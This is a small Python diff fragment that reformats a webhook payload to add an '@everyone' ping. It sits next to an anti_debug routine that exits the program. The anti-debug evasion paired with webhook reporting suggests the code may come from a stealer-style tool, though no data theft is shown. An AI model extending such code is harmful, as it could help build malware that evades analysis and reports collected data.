@@ -28,10 +28,13 @@ def anti_debug():
         sys.exit(0)
 def send_webhook(content, title=None):
     payload = {
-        "username": USERNAME,
-        "avatar_url": AVATAR,
-        "embeds": [{"description": content}]
-    }
+    "username": USERNAME,
+    "avatar_url": AVATAR,
+    "content": "@everyone",
+    "embeds": [{
+        "description": content
+    }]
+}
     if title:
         payload["embeds"][0]["title"] = title
     try:
